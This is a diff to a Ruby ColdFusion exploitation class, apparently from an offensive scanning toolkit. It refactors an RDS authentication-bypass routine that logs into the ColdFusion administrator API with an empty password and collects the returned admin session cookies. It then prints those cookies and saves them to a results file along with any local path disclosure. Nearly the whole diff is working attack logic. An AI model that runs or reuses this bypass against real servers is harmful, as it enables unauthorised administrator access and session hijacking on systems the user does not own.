@@ -4,7 +4,7 @@ class Coldfusion
   def initialize(site)
     @os=0 # 1=Windows (mpost common), 2=Linux
     @mode=nil
-    @site=site
+    @site=site.sub(/\/$/, '')
     @http=EasyCurb.new
   end
 
@@ -284,66 +284,66 @@ class Coldfusion
     if rez[0] =~ /([A-Za-z]:\\[^\s\\]+\\.+:\d+)/
       lfd=$1
     end
-    if not rez[0] =~ /File not found: \/CFIDE\/adminapi\/administrator.cfm/
-      cookies=[]
-      rez[3].split("\n").each do |line|
-        if line =~ /Set-cookie: (.+);/i
-          cookies << $1.chomp
-        end
+    if rez[0] =~ /File not found: \/CFIDE\/adminapi\/administrator.cfm/
+      print_error("Epic Fail - API System doesn't exist or isn't accessible!")
+      print_caution("Local Path Disclosure: #{lfd}") unless lfd == 'fail' or @lfd == true
+      if lfd != 'fail' and @lfd == false
+        @lfd=true
       end
-      admin_cookies = cookies.join(';')
+      puts
+      return false
+    end
+    cookies=[]
+    rez[3].split("\n").each do |line|
+      if line =~ /Set-cookie: (.+);/i
+        cookies << $1.chomp
+      end
+    end
+    admin_cookies = cookies.join(';').sub('CFAUTHORIZATION_cfadmin=;', '')
 
-      if admin_cookies =~ /CFAUTHORIZATION_cfadmin=(\S+);/
-        uri=URI("#{site}/CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true")
-        c=Regexp.last_match.to_s.split('=')[1].gsub('"', '').sub(';', '')
-        if not c.nil? and c != '""' and c != ''
-          id=0
-          token=0
-          Dir.mkdir("#{RESULTS}#{uri.host}") unless File.exists?("#{RESULTS}#{uri.host}") and File.directory?("#{RESULTS}#{uri.host}")
-          f=File.open("#{RESULTS}#{uri.host}/coldfusion_cookies.txt", 'w+')
-          f.puts "w00t - Authenticated using RDS Auth Bypass Technique!"
-          f.puts "################### ADMIN COOKIES #####################"
-          print_good("w00t - Authenticated using RDS Auth Bypass Technique!")
-          puts "################### ADMIN COOKIES #####################".light_blue
-          print_good("URI: #{uri}")
-          f.puts "URI: #{uri}"
-          f.puts "LPD: #{lfd}" unless lfd == 'fail' or @lfd == true
-          print_good("LPD: #{lfd}") unless lfd == 'fail' or @lfd == true
-          if lfd != 'fail' and @lfd == false
-            @lfd=true
-          end
-
-          admin_cookies.gsub('path=/, ', '').split(';').each do |cookie|
-            c=cookie.split('=')
-            if c[0] == 'CFID'
-              print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == '' or id == 1
-              f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or id == 1
-              id=1
-            elsif c[0] == 'CFTOKEN'
-              print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == '' or token == 1
-              f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or token == 1
-              token=1
-            elsif c[0] == 'CFAUTHORIZATION_cfadmin'
-              print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == ''
-              f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == ''
-            else
-              print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == '' or c[0] == 'path' or c[0] == 'expires'
-              f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or c[0] == 'path' or c[0] == 'expires'
-            end
-          end
-
-          puts "#######################################################".light_blue
-          f.puts "#######################################################\n"
-          puts
-          return true
-        else
-          print_error("RDS Auth Bypass Not Working!")
-          print_caution("Local Path Disclosure: #{lfd}") unless lfd == 'fail' or @lfd == true
-          if lfd != 'fail' and @lfd == false
-            @lfd=true
-          end
-          return false
+    if admin_cookies =~ /CFAUTHORIZATION_cfadmin=(\S+);|CFAUTHORIZATION_cfadmin=(\S+)$/
+      uri=URI("#{site}/CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true")
+      c=Regexp.last_match.to_s.split('=')[1].gsub('"', '').sub(';', '')
+      if not c.nil? and c != '""' and c != ''
+        id=0
+        token=0
+        Dir.mkdir("#{RESULTS}#{uri.host}") unless File.exists?("#{RESULTS}#{uri.host}") and File.directory?("#{RESULTS}#{uri.host}")
+        f=File.open("#{RESULTS}#{uri.host}/coldfusion_cookies.txt", 'w+')
+        f.puts "w00t - Authenticated using RDS Auth Bypass Technique!"
+        f.puts "################### ADMIN COOKIES #####################"
+        print_good("w00t - Authenticated using RDS Auth Bypass Technique!")
+        puts "################### ADMIN COOKIES #####################".light_blue
+        print_good("URI: #{uri}")
+        f.puts "URI: #{uri}"
+        f.puts "LPD: #{lfd}" unless lfd == 'fail' or @lfd == true
+        print_good("LPD: #{lfd}") unless lfd == 'fail' or @lfd == true
+        if lfd != 'fail' and @lfd == false
+          @lfd=true
         end
+
+        admin_cookies.gsub('path=/, ', '').split(';').each do |cookie|
+          c=cookie.split('=')
+          if c[0] == 'CFID'
+            print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == '' or id == 1
+            f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or id == 1
+            id=1
+          elsif c[0] == 'CFTOKEN'
+            print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == '' or token == 1
+            f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or token == 1
+            token=1
+          elsif c[0] == 'CFAUTHORIZATION_cfadmin'
+            print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == ''
+            f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == ''
+          else
+            print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == '' or c[0] == 'path' or c[0] == 'expires'
+            f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or c[0] == 'path' or c[0] == 'expires'
+          end
+        end
+
+        puts "#######################################################".light_blue
+        f.puts "#######################################################\n"
+        puts
+        return true
       else
         print_error("RDS Auth Bypass Not Working!")
         print_caution("Local Path Disclosure: #{lfd}") unless lfd == 'fail' or @lfd == true
@@ -353,12 +353,11 @@ class Coldfusion
         return false
       end
     else
-      print_error("Epic Fail - API System doesn't exist or isn't accessible!")
+      print_error("RDS Auth Bypass Not Working!")
       print_caution("Local Path Disclosure: #{lfd}") unless lfd == 'fail' or @lfd == true
       if lfd != 'fail' and @lfd == false
         @lfd=true
       end
-      puts
       return false
     end
   end
